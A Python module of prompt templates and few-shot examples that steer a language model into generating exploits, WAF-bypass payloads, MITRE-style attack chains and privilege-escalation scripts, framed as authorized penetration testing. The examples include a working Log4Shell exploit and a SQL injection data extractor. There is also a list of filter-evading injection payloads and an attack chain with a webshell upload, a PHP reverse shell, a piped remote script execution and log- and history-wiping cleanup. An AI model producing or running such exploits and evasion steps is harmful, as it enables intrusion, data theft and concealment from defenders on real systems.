"""
Enhanced LLM Prompts for Exploit Generation

This module provides carefully crafted prompts that:
1. Generate more accurate and reliable exploits
2. Include proper error handling
3. Follow security best practices
4. Provide structured output

Prompt engineering techniques used:
- Few-shot examples
- Chain-of-thought reasoning
- Structured output formatting
- Safety constraints
"""

from typing import Dict, List, Any, Optional, Tuple
from enum import Enum


class PromptTemplate(Enum):
    """Types of prompt templates"""
    EXPLOIT_GENERATION = "exploit_generation"
    PAYLOAD_ADAPTATION = "payload_adaptation"
    WAF_BYPASS = "waf_bypass"
    ATTACK_CHAIN = "attack_chain"
    PRIVESC_ENUM = "privesc_enum"
    CVE_EXPLOIT = "cve_exploit"
    COMMAND_CRAFT = "command_craft"
    OUTPUT_ANALYSIS = "output_analysis"


# ============================================================================
# System Prompts (Role Definition)
# ============================================================================

SYSTEM_PROMPTS = {
    PromptTemplate.EXPLOIT_GENERATION: """You are an expert penetration testing AI assistant specializing in exploit development.

ROLE: Generate precise, reliable exploit code for AUTHORIZED security assessments.

PRINCIPLES:
1. Safety First: Include proper error handling, timeouts, and cleanup
2. Targeted: Exploits should be specific to the vulnerability, not generic
3. Reliable: Code should work consistently, handle edge cases
4. Documented: Include inline comments explaining critical sections
5. Ethical: Only for authorized testing, never destructive

OUTPUT FORMAT:
- Start with a brief comment describing what the exploit does
- Include all necessary imports
- Define functions with docstrings
- Main exploit logic with error handling
- Success/failure indicators
- Cleanup section

CONSTRAINTS:
- No disk-wiping or destructive operations
- Include connection timeouts (max 30 seconds)
- Handle exceptions gracefully
- Provide clear success/failure output""",

    PromptTemplate.PAYLOAD_ADAPTATION: """You are a security payload specialist for authorized penetration testing.

ROLE: Adapt and transform payloads while maintaining functionality.

TECHNIQUES:
1. Encoding: URL, Unicode, HTML entities, Base64, Hex
2. Case Manipulation: Mixed case, alternating case
3. Comment Insertion: SQL comments, HTML comments
4. Alternative Syntax: Different but equivalent expressions
5. Chunking: Breaking payload into parts
6. Obfuscation: String concatenation, char codes

OUTPUT FORMAT:
Return each variant on a new line with technique label:
[TECHNIQUE_NAME] payload_here

IMPORTANT: Maintain the original payload's functionality!""",

    PromptTemplate.WAF_BYPASS: """You are a WAF bypass specialist for authorized security testing.

ROLE: Generate alternative payload encodings that evade web application firewalls.

KNOWN WAF BEHAVIORS:
- Cloudflare: Blocks common SQLi/XSS patterns, keyword matching
- ModSecurity: Rule-based, signature matching
- Akamai: ML-based detection, behavioral analysis
- AWS WAF: Configurable rules, rate limiting
- Imperva: Deep packet inspection, bot detection

BYPASS TECHNIQUES BY PAYLOAD TYPE:

SQL Injection:
- Case variation: SeLeCt, UniOn
- Comment insertion: UN/**/ION, SEL/**/ECT
- URL encoding: %53%45%4c%45%43%54
- Double URL encoding: %2553%2545%254c%2545%2543%2554
- Unicode: \\u0053ELECT
- Null bytes: SEL%00ECT
- Whitespace alternatives: SELECT\\t, SELECT\\n

XSS:
- HTML encoding: &#x3c;script&#x3e;
- Event handlers: onerror, onload, onfocus
- SVG/MathML: <svg onload=...>, <math><maction>
- Data URIs: javascript:, data:text/html
- Template literals: `${alert(1)}`

Command Injection:
- Variable substitution: $IFS, ${IFS}
- Encoding: \\x commands, $'\\x...'
- Alternative commands: head vs cat, wget vs curl

OUTPUT: Generate 5-10 bypass variants, most likely to succeed first.""",

    PromptTemplate.ATTACK_CHAIN: """You are a red team attack strategist for authorized penetration testing.

ROLE: Design multi-step attack sequences that chain vulnerabilities effectively.

METHODOLOGY (MITRE ATT&CK aligned):
1. Initial Access: How to get in (exploit, creds, phishing)
2. Execution: How to run code
3. Persistence: How to maintain access
4. Privilege Escalation: How to elevate
5. Defense Evasion: How to avoid detection
6. Credential Access: How to harvest creds
7. Lateral Movement: How to spread
8. Collection: How to gather data
9. Exfiltration: How to extract data

OUTPUT FORMAT:
```
OBJECTIVE: [Clear end goal]

STEP 1: [Name] (Tactic: [ATT&CK Tactic])
  - Technique: [ATT&CK ID if known]
  - Action: [Specific action to take]
  - Tool: [Tool to use]
  - Command: [Exact command]
  - Success Indicator: [What success looks like]
  - Fallback: [Alternative if this fails]

STEP 2: ...

CLEANUP:
  - [Cleanup commands to remove artifacts]
```

PRINCIPLES:
- Start with most reliable entry point
- Each step should have a fallback
- Consider detection at each step
- Include cleanup for OPSEC""",

    PromptTemplate.PRIVESC_ENUM: """You are a privilege escalation specialist for authorized testing.

ROLE: Generate enumeration and exploitation scripts for local privilege escalation.

LINUX VECTORS:
1. SUID/GUID binaries (GTFOBins)
2. Sudo misconfigurations (sudo -l)
3. Writable /etc/passwd or shadow
4. Cron jobs (writable scripts, PATH hijack)
5. Kernel exploits (uname -a)
6. Capabilities (getcap)
7. NFS shares (no_root_squash)
8. Docker/LXC escape
9. Writable service files
10. LD_PRELOAD/LD_LIBRARY_PATH

WINDOWS VECTORS:
1. Unquoted service paths
2. Weak service permissions
3. AlwaysInstallElevated
4. Stored credentials (cmdkey)
5. Token impersonation (SeImpersonate)
6. UAC bypass
7. DLL hijacking
8. Scheduled tasks
9. Registry autoruns
10. Kernel exploits

OUTPUT: Generate a comprehensive enumeration script that:
1. Checks each vector systematically
2. Reports findings clearly
3. Suggests exploitation steps
4. Includes safety checks""",

    PromptTemplate.CVE_EXPLOIT: """You are a CVE exploit developer for authorized security testing.

ROLE: Generate working exploit code for specific CVE vulnerabilities.

METHODOLOGY:
1. Analyze the CVE details and affected components
2. Understand the root cause (buffer overflow, injection, deserialization, etc.)
3. Identify the attack vector (network, local, user interaction)
4. Craft the exploit with proper payload delivery
5. Include verification of successful exploitation

CVE ANALYSIS TEMPLATE:
```
CVE: [CVE-XXXX-XXXXX]
Affected: [Product/Version]
Type: [Vulnerability Type]
Vector: [Network/Local/Adjacent]
Complexity: [Low/High]
Root Cause: [Technical explanation]
```

EXPLOIT REQUIREMENTS:
1. Version check before exploitation (if possible)
2. Proper payload formatting
3. Error handling for common failures
4. Success verification
5. Cleanup/restore functionality

OUTPUT: Complete, documented exploit code with usage instructions.""",

    PromptTemplate.COMMAND_CRAFT: """You are a command-line security tool expert.

ROLE: Craft optimal commands for security tools based on target and objective.

TOOL KNOWLEDGE:
- nmap: Port scanning, service detection, scripts
- sqlmap: SQL injection automation
- nikto: Web server scanning
- gobuster/ffuf: Directory/file bruteforcing
- hydra: Password bruteforcing
- nuclei: Template-based scanning
- metasploit: Exploitation framework
- burp/zap: Web proxy tools

OPTIMIZATION PRINCIPLES:
1. Use appropriate verbosity (not too noisy)
2. Set reasonable timeouts
3. Target specific ports/services when known
4. Use relevant scripts/templates
5. Consider stealth vs speed tradeoff

OUTPUT: Single optimized command with explanation of flags used.""",

    PromptTemplate.OUTPUT_ANALYSIS: """You are a security tool output analyst.

ROLE: Parse and extract structured information from security tool outputs.

EXTRACTION TARGETS:
1. Vulnerabilities: Type, severity, location, CVE
2. Credentials: Usernames, passwords, hashes
3. Services: Port, protocol, version, banners
4. Paths: URLs, file paths, directories
5. Errors: Error messages, stack traces
6. Indicators: Success/failure patterns

OUTPUT FORMAT (JSON):
```json
{
  "vulnerabilities": [...],
  "credentials": [...],
  "services": [...],
  "paths": [...],
  "summary": "..."
}
```

Be thorough but avoid false positives. If uncertain, include confidence level.""",
}


# ============================================================================
# Few-Shot Examples
# ============================================================================

FEW_SHOT_EXAMPLES = {
    PromptTemplate.EXPLOIT_GENERATION: """
EXAMPLE 1:
User: Generate Python exploit for CVE-2021-44228 (Log4Shell)
Assistant:
```python
#!/usr/bin/env python3
\"\"\"
CVE-2021-44228 Log4Shell Exploit
Exploits JNDI injection in Apache Log4j 2.x
\"\"\"

import requests
import argparse
import sys
from urllib.parse import quote

def exploit(target_url, callback_host, callback_port, header="X-Api-Version"):
    \"\"\"
    Send Log4Shell payload to target.
    
    Args:
        target_url: Target URL
        callback_host: LDAP/HTTP callback server
        callback_port: Callback port
        header: HTTP header to inject (default: X-Api-Version)
    \"\"\"
    # Craft JNDI payload with obfuscation to bypass basic filters
    payload = "${${lower:j}ndi:${lower:l}dap://" + callback_host + ":" + str(callback_port) + "/exploit}"
    
    headers = {
        header: payload,
        "User-Agent": payload,  # Try multiple injection points
    }
    
    try:
        print(f"[*] Sending payload to {target_url}")
        print(f"[*] Callback: {callback_host}:{callback_port}")
        
        response = requests.get(
            target_url,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f"[+] Request sent, status: {response.status_code}")
        print("[*] Check your callback server for incoming connection")
        return True
        
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Log4Shell Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--callback", required=True, help="Callback host")
    parser.add_argument("-p", "--port", type=int, default=1389, help="Callback port")
    args = parser.parse_args()
    
    exploit(args.url, args.callback, args.port)
```

EXAMPLE 2:
User: Generate SQL injection data extraction exploit
Assistant:
```python
#!/usr/bin/env python3
\"\"\"
SQL Injection Data Extractor
Extracts database contents via UNION-based SQL injection
\"\"\"

import requests
import re
import sys
from urllib.parse import quote

class SQLiExtractor:
    def __init__(self, url, param, columns=5):
        self.url = url
        self.param = param
        self.columns = columns
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
    
    def test_injection(self):
        \"\"\"Test if injection point is vulnerable\"\"\"
        test_payloads = ["'", "1' AND '1'='1", "1' AND '1'='2"]
        responses = []
        
        for payload in test_payloads:
            try:
                r = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
                responses.append(len(r.text))
            except:
                return False
        
        # Different response lengths indicate injection
        return len(set(responses)) > 1
    
    def extract_databases(self):
        \"\"\"Extract database names\"\"\"
        payload = f"1' UNION SELECT {'NULL,'*(self.columns-1)}GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -"
        
        try:
            r = self.session.get(self.url, params={self.param: payload}, timeout=10)
            # Extract database names from response
            matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*(?:,[a-zA-Z_][a-zA-Z0-9_]*)*)', r.text)
            return matches[0].split(',') if matches else []
        except Exception as e:
            print(f"[-] Error: {e}")
            return []
    
    def extract_tables(self, database):
        \"\"\"Extract table names from database\"\"\"
        payload = f"1' UNION SELECT {'NULL,'*(self.columns-1)}GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'-- -"
        
        try:
            r = self.session.get(self.url, params={self.param: payload}, timeout=10)
            matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*(?:,[a-zA-Z_][a-zA-Z0-9_]*)*)', r.text)
            return matches[0].split(',') if matches else []
        except:
            return []

# Usage
if __name__ == "__main__":
    extractor = SQLiExtractor(
        url="http://target.com/page.php",
        param="id",
        columns=5
    )
    
    if extractor.test_injection():
        print("[+] Injection confirmed!")
        databases = extractor.extract_databases()
        print(f"[+] Databases: {databases}")
```
""",

    PromptTemplate.WAF_BYPASS: """
EXAMPLE:
User: Bypass CloudFlare WAF for: ' OR 1=1--
Assistant:
[URL_ENCODE] %27%20OR%201%3d1--
[DOUBLE_URL] %2527%2520OR%25201%253d1--
[UNICODE] ' \\u004fR 1=1--
[CASE_MIX] ' oR 1=1--
[COMMENT_INSERT] '/**/OR/**/1=1--
[CONCAT] ' OR '1'='1'--
[HEX_ENCODE] ' OR 0x313d31--
[CHAR_FUNC] ' OR CHAR(49)=CHAR(49)--
[NO_SPACE] '/**/OR/**/1=1--
[NEWLINE] '\\nOR\\n1=1--

Most likely to succeed: DOUBLE_URL, COMMENT_INSERT, CASE_MIX
""",

    PromptTemplate.ATTACK_CHAIN: """
EXAMPLE:
User: Design attack chain for web server with SQLi and file upload
Assistant:
```
OBJECTIVE: Obtain root shell on target web server

STEP 1: SQL Injection Reconnaissance (Tactic: Discovery)
  - Technique: T1190 - Exploit Public-Facing Application
  - Action: Extract database credentials and admin hashes
  - Tool: sqlmap
  - Command: sqlmap -u 'http://target/page?id=1' --batch --dbs --dump
  - Success Indicator: Database tables dumped, credentials visible
  - Fallback: Try time-based blind injection if UNION fails

STEP 2: Admin Panel Access (Tactic: Initial Access)
  - Technique: T1078 - Valid Accounts
  - Action: Crack admin hash or use SQL bypass to access admin panel
  - Tool: hashcat / direct login
  - Command: hashcat -m 0 hash.txt rockyou.txt
  - Success Indicator: Admin dashboard accessible
  - Fallback: Try password reset via SQLi if hash doesn't crack

STEP 3: Webshell Upload (Tactic: Execution)
  - Technique: T1105 - Ingress Tool Transfer
  - Action: Upload PHP webshell via file upload functionality
  - Tool: curl / browser
  - Command: curl -F 'file=@shell.php' http://target/admin/upload
  - Success Indicator: Shell accessible at /uploads/shell.php
  - Fallback: Try .phtml, .php5 extensions if .php blocked

STEP 4: Reverse Shell (Tactic: Command and Control)
  - Technique: T1059 - Command and Scripting Interpreter
  - Action: Upgrade webshell to full reverse shell
  - Tool: netcat
  - Command: php -r '$s=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  - Success Indicator: Incoming connection on listener
  - Fallback: Try different reverse shell (python, perl)

STEP 5: Privilege Escalation (Tactic: Privilege Escalation)
  - Technique: T1548 - Abuse Elevation Control Mechanism
  - Action: Enumerate and exploit SUID binaries or sudo misconfig
  - Tool: linpeas.sh
  - Command: curl -L https://linpeas.sh | sh
  - Success Indicator: uid=0(root)
  - Fallback: Check kernel version for known exploits

CLEANUP:
  - rm -f /var/www/html/uploads/shell.php
  - history -c
  - rm -f ~/.bash_history
  - Clear web server access logs if possible
```
""",
}


# ============================================================================
# Prompt Builders
# ============================================================================

def build_exploit_prompt(
    vulnerability: Dict[str, Any],
    target: Dict[str, Any],
    constraints: List[str] = None,
    language: str = "python"
) -> str:
    """Build prompt for exploit generation"""
    
    constraints = constraints or []
    
    prompt = f"""Generate a {language} exploit for the following vulnerability.

VULNERABILITY DETAILS:
- Type: {vulnerability.get('type', 'unknown')}
- CVE: {vulnerability.get('cve', vulnerability.get('cve_id', 'N/A'))}
- Description: {vulnerability.get('description', vulnerability.get('details', 'Standard vulnerability'))}
- Severity: {vulnerability.get('severity', 'unknown')}

TARGET INFORMATION:
- URL/Host: {target.get('url', target.get('host', 'unknown'))}
- Port: {target.get('port', 'default')}
- Operating System: {target.get('os', 'unknown')}
- Web Server: {target.get('webserver', 'unknown')}
- Technologies: {', '.join(target.get('technologies', ['unknown']))}
- WAF Detected: {target.get('waf', 'unknown')}

CALLBACK CONFIGURATION (for reverse shells):
- LHOST: {target.get('lhost', '10.10.14.1')}
- LPORT: {target.get('lport', 4444)}

{f"CONSTRAINTS:" + chr(10) + chr(10).join(f"- {c}" for c in constraints) if constraints else ""}

REQUIREMENTS:
1. Complete, working code (not pseudocode)
2. Proper error handling with try/except
3. Connection timeouts (max 30 seconds)
4. Clear success/failure indicators in output
5. Comments explaining critical sections
6. Cleanup functionality if applicable

Generate the complete {language} exploit:"""

    return prompt


def build_waf_bypass_prompt(
    original_payload: str,
    waf_type: str = "generic",
    payload_type: str = "sqli",
    failed_attempts: List[str] = None
) -> str:
    """Build prompt for WAF bypass generation"""
    
    failed_attempts = failed_attempts or []
    
    prompt = f"""Generate WAF bypass variants for the following payload.

ORIGINAL PAYLOAD:
{original_payload}

PAYLOAD TYPE: {payload_type}
WAF TYPE: {waf_type}

{f"PREVIOUSLY FAILED (avoid similar patterns):" + chr(10) + chr(10).join(f"- {p}" for p in failed_attempts) if failed_attempts else ""}

Generate 10 bypass variants using different techniques:
1. URL encoding (single and double)
2. Unicode/UTF-8 encoding
3. Case manipulation
4. Comment insertion
5. Whitespace alternatives
6. String concatenation
7. Hex encoding
8. Alternative syntax
9. Null byte insertion
10. Chunked encoding

Format each variant as:
[TECHNIQUE] payload

Order by likelihood of success (most likely first)."""

    return prompt


def build_attack_chain_prompt(
    vulnerabilities: List[Dict[str, Any]],
    target: Dict[str, Any],
    objective: str
) -> str:
    """Build prompt for attack chain planning"""
    
    vuln_list = "\n".join([
        f"- {v.get('type', 'unknown')}: {v.get('description', 'No description')[:100]}"
        for v in vulnerabilities[:10]
    ])
    
    prompt = f"""Design a multi-step attack chain for authorized penetration testing.

TARGET:
- URL/Host: {target.get('url', target.get('host', 'unknown'))}
- Operating System: {target.get('os', 'unknown')}
- Technologies: {', '.join(target.get('technologies', ['unknown']))}

DISCOVERED VULNERABILITIES:
{vuln_list}

OBJECTIVE: {objective}

CALLBACK CONFIGURATION:
- LHOST: {target.get('lhost', '10.10.14.1')}
- LPORT: {target.get('lport', 4444)}

Design an attack chain that:
1. Starts with the most reliable vulnerability for initial access
2. Chains steps logically (each step enables the next)
3. Includes specific commands/payloads for each step
4. Has fallback options for critical steps
5. Ends with achieving the stated objective
6. Includes cleanup commands

Use this format for each step:
STEP N: [Name] (Tactic: [MITRE ATT&CK Tactic])
  - Action: [What to do]
  - Tool: [Tool to use]
  - Command: [Exact command]
  - Success Indicator: [What success looks like]
  - Fallback: [Alternative if this fails]"""

    return prompt


def build_privesc_prompt(
    target_os: str = "linux",
    current_user: str = "www-data",
    known_info: Dict[str, Any] = None
) -> str:
    """Build prompt for privilege escalation script generation"""
    
    known_info = known_info or {}
    
    prompt = f"""Generate a privilege escalation enumeration script.

TARGET SYSTEM:
- Operating System: {target_os}
- Current User: {current_user}
- Kernel Version: {known_info.get('kernel', 'unknown')}
- Architecture: {known_info.get('arch', 'unknown')}

KNOWN INFORMATION:
- SUID Binaries: {', '.join(known_info.get('suid', ['not enumerated'])[:10])}
- Sudo Permissions: {known_info.get('sudo', 'not checked')}
- Writable Directories: {', '.join(known_info.get('writable', ['not enumerated'])[:5])}
- Running Services: {', '.join(known_info.get('services', ['not enumerated'])[:5])}

Generate a {"bash" if target_os.lower() == "linux" else "powershell"} script that:

1. ENUMERATION PHASE:
   - Check all common privilege escalation vectors
   - Identify quick wins (GTFOBins, misconfigurations)
   - Report findings in clear format

2. ANALYSIS PHASE:
   - Prioritize findings by exploitability
   - Suggest specific exploitation steps

3. SAFETY:
   - Include checks to avoid system damage
   - Don't modify critical files without confirmation

Output a complete, runnable script."""

    return prompt


def build_cve_exploit_prompt(
    cve_id: str,
    target: Dict[str, Any],
    language: str = "python"
) -> str:
    """Build prompt for CVE-specific exploit generation"""
    
    prompt = f"""Generate a working exploit for {cve_id}.

TARGET INFORMATION:
- Host: {target.get('host', target.get('url', 'unknown'))}
- Port: {target.get('port', 'default')}
- Operating System: {target.get('os', 'unknown')}
- Product Version: {target.get('version', 'unknown')}

CALLBACK (for reverse shells):
- LHOST: {target.get('lhost', '10.10.14.1')}
- LPORT: {target.get('lport', 4444)}

REQUIREMENTS:
1. Research the CVE and understand the vulnerability
2. Generate complete, working {language} exploit code
3. Include version checking if possible
4. Handle common error cases
5. Provide clear usage instructions
6. Include success verification

Structure your response:
1. Brief CVE analysis (vulnerability type, affected versions)
2. Complete exploit code
3. Usage example
4. Expected output on success"""

    return prompt


def build_command_prompt(
    tool: str,
    target: str,
    objective: str,
    context: Dict[str, Any] = None
) -> str:
    """Build prompt for optimal command generation"""
    
    context = context or {}
    
    prompt = f"""Generate an optimal {tool} command for the following scenario.

TOOL: {tool}
TARGET: {target}
OBJECTIVE: {objective}

CONTEXT:
- Operating System: {context.get('os', 'unknown')}
- Port: {context.get('port', 'default')}
- Authentication: {context.get('auth', 'none')}
- Stealth Required: {context.get('stealth', False)}
- Previous Results: {context.get('previous', 'none')}

Generate a single, optimized command that:
1. Achieves the stated objective
2. Uses appropriate flags for the context
3. Balances thoroughness with speed
4. Considers stealth if required

Output format:
COMMAND: [the command]
EXPLANATION: [brief explanation of key flags]"""

    return prompt


# ============================================================================
# Prompt Manager
# ============================================================================

class PromptManager:
    """
    Manages prompt templates and construction.
    
    Usage:
        manager = PromptManager()
        
        # Get system prompt
        system = manager.get_system_prompt(PromptTemplate.EXPLOIT_GENERATION)
        
        # Build user prompt
        user = manager.build_prompt(
            PromptTemplate.EXPLOIT_GENERATION,
            vulnerability={...},
            target={...}
        )
    """
    
    def __init__(self):
        self.system_prompts = SYSTEM_PROMPTS
        self.examples = FEW_SHOT_EXAMPLES
    
    def get_system_prompt(self, template: PromptTemplate) -> str:
        """Get system prompt for template type"""
        return self.system_prompts.get(template, "You are a helpful security assistant.")
    
    def get_examples(self, template: PromptTemplate) -> str:
        """Get few-shot examples for template type"""
        return self.examples.get(template, "")
    
    def build_prompt(self, template: PromptTemplate, **kwargs) -> str:
        """Build complete prompt for template type"""
        
        builders = {
            PromptTemplate.EXPLOIT_GENERATION: build_exploit_prompt,
            PromptTemplate.WAF_BYPASS: build_waf_bypass_prompt,
            PromptTemplate.ATTACK_CHAIN: build_attack_chain_prompt,
            PromptTemplate.PRIVESC_ENUM: build_privesc_prompt,
            PromptTemplate.CVE_EXPLOIT: build_cve_exploit_prompt,
            PromptTemplate.COMMAND_CRAFT: build_command_prompt,
        }
        
        builder = builders.get(template)
        if builder:
            return builder(**kwargs)
        
        return str(kwargs)
    
    def get_full_prompt(
        self,
        template: PromptTemplate,
        include_examples: bool = True,
        **kwargs
    ) -> Tuple[str, str]:
        """
        Get complete system and user prompts.
        
        Returns:
            Tuple of (system_prompt, user_prompt)
        """
        system = self.get_system_prompt(template)
        
        user_parts = []
        if include_examples:
            examples = self.get_examples(template)
            if examples:
                user_parts.append("Here are some examples:\n" + examples)
        
        user_parts.append(self.build_prompt(template, **kwargs))
        
        return system, "\n\n".join(user_parts)


# Singleton
_prompt_manager: Optional[PromptManager] = None


def get_prompt_manager() -> PromptManager:
    """Get singleton PromptManager"""
    global _prompt_manager
    if _prompt_manager is None:
        _prompt_manager = PromptManager()
    return _prompt_manager
